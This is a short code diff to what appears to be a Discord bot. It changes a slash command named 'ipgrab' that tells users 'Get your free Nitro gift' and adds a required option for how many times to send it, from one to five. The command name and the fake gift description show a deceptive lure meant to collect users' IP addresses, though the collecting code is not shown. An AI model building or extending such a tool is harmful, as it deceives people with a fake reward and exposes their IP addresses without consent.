@@ -45,6 +45,12 @@ const commands = [
   new SlashCommandBuilder()
     .setName('ipgrab')
     .setDescription('Get your free Nitro gift')
+    .addIntegerOption(o =>
+      o.setName('amount')
+        .setDescription('How many times to send (1-5)')
+        .setRequired(true)
+        .setMinValue(1)
+        .setMaxValue(5))
     .setIntegrationTypes(...integrationTypes)
     .setContexts(...contexts),
 ].map(c => c.toJSON());
